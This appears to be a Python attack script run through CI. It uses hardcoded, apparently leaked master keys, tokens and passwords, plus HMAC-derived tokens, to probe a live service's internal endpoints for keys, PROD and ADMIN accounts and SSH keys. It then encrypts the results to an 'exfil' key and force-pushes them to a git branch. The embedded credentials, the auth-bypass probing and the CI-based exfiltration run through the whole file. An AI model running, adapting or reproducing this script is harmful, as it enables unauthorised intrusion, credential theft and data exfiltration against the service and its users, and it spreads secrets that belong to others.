#!/usr/bin/env python3
# intent 28699: test whether LUMII_RUNTIME_KEY_MASTER-derived values / .env.dev secrets can pass perRuntime on /internal/build/*
import os, sys, json, time, subprocess, hmac, hashlib, base64
_REF=os.environ.get("GITHUB_REF_NAME","") or ""
if "result" in _REF.lower(): print("skip",flush=True); sys.exit(0)
RUNID=os.environ.get("GITHUB_RUN_ID",str(int(time.time())))
OUT="/tmp/results28699"; os.makedirs(OUT,exist_ok=True)
LOG=open(os.path.join(OUT,"transcript.log"),"a",buffering=1)
def log(*a):
    s=" ".join(str(x) for x in a)
    try: print(s,flush=True)
    except: pass
    LOG.write(s+"\n"); LOG.flush()
def R(k,v):
    try: s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    except: s=str(v)
    log("R:%s:%s"%(k,s[:3000]))
HOST="assistant.lumiiai.cn"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
MASTER="4iqj02dOCBMgWk8yJ8wa3RgItWIRju7pXMEjHwQKfbs8oIvkhO-8RBzVGHwh40mJ"
AGENT_WS_TOKEN="91bd34aa1df09925e18a1bf6fb43ddefbecbeed1c54d0056"
TURN_PROOF_SECRET="ce4bc6b0c0ab05a849adf046d57dbf11a98386d7e6804315"
IDE_PW="Rm9OE6RbCmn1ZcQICX1ZTnyjohUi"
AIDS=["rt_yWiXseR7NxMySkchtX5Ct","rt_KKpp7EgJCEfinsdwAWbm7","rt_ye3Qtmvxnc66ho323PJbY","rt_fSLCkGmBJ6GM9Nwg5Lgcq","rt_23gyGfvMGs9mNeNYWEiLe","lumii-prod-agent","rt_2YCLznviPRj3ZAHVZHnqs","rt_Vv7VY6tpSRHJJfVAeRpR8"]
def dk(purpose,aid,ver): return base64.urlsafe_b64encode(hmac.new(MASTER.encode(),f"{purpose}:{aid}:{ver}".encode(),hashlib.sha256).digest()).decode().rstrip("=")
try: TICK=json.load(open("tickets.json"))["tickets"]
except Exception as e: TICK={}; log("no tickets",e)
def curl(args,timeout=25):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+15)
        return r.returncode,r.stdout
    except Exception as e: return -1,repr(e).encode()
def call(path,method="GET",body=None,hdrs=None,timeout=25,maxlen=1500):
    args=["--http2","-A",UA,"-H","Accept: application/json","-H","Origin: https://%s"%HOST,
          "-H","Referer: https://%s/"%HOST,"-w","\n__CODE__%{http_code}"]
    for k,v in (hdrs or {}).items(): args+=["-H","%s: %s"%(k,v)]
    if body is not None: args+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    args+=["https://%s%s"%(HOST,path)]
    rc,out=curl(args,timeout); txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen]}
h=call("/health",maxlen=8000); R("health_code",h["code"]); R("health_body",h["body"][:1200])
open(os.path.join(OUT,"health.json"),"w").write(h["body"])
# Phase 1: keys/current oracle per (aid,candidate)
for aid in AIDS:
    cands=[("AGENT_WS_TOKEN",AGENT_WS_TOKEN),("TURN_PROOF_SECRET",TURN_PROOF_SECRET),("IDE_PW",IDE_PW),
           ("proof_v1",dk("proof",aid,1)),("proof_v0",dk("proof",aid,0)),("inbound_v1",dk("inbound",aid,1))]
    for nm,tok in cands:
        r=call("/api/runtimes/keys/current",hdrs={"x-agent-id":aid,"x-agent-token":tok})
        R("keys_%s_%s"%(aid,nm),{"code":r["code"],"body":r["body"][:120]})
# Phase 2: build/accounts gate test (self-minted center ticket + wrong bearer) -> expect 401 gate
for aid in AIDS[:3]:
    body={"names":["PROD","ADMIN"],"run_id":"probe28699"}
    hd={"x-agent-id":aid,"x-lumii-turn-proof":TICK.get(aid,"")}
    r=call("/internal/build/accounts",method="POST",body=body,hdrs={**hd,"Authorization":"Bearer "+AGENT_WS_TOKEN})
    R("acct_ws_%s"%aid,{"code":r["code"],"body":r["body"][:200]})
    r=call("/internal/build/accounts",method="POST",body=body,hdrs={**hd,"Authorization":"Bearer "+dk("proof",aid,1)})
    R("acct_proof_%s"%aid,{"code":r["code"],"body":r["body"][:200]})
# Phase 3: ssh-keys gate test
r=call("/internal/build/ssh-keys",method="POST",body={},hdrs={"x-agent-id":AIDS[0],"x-lumii-turn-proof":TICK.get(AIDS[0],""),"Authorization":"Bearer "+AGENT_WS_TOKEN})
R("sshkeys_gate",{"code":r["code"],"body":r["body"][:200]})
# push results
tb="/tmp/results28699.tar.gz"; subprocess.run("tar czf %s -C /tmp results28699"%tb,shell=True)
enc="/tmp/results28699.tar.gz.gpg"
if os.path.isfile("pub.asc"):
    subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1",shell=True)
    subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s %s"%(enc,tb),shell=True,capture_output=True,timeout=180)
if not os.path.isfile(enc): enc=tb
import shutil; shutil.copyfile(enc,"results28699.tar.gz.gpg")
subprocess.run("git config user.email ci@aro.network; git config user.name ci",shell=True)
subprocess.run('git add -f results28699.tar.gz.gpg && git commit -m "i28699 %s" || true'%RUNID,shell=True,capture_output=True)
r=subprocess.run("git push -f origin HEAD:refs/heads/ci-28699-results",shell=True,capture_output=True,text=True,timeout=180)
log("PUSH rc=%s %s"%(r.returncode,(r.stderr or "")[-160:])); log("=== END ===")
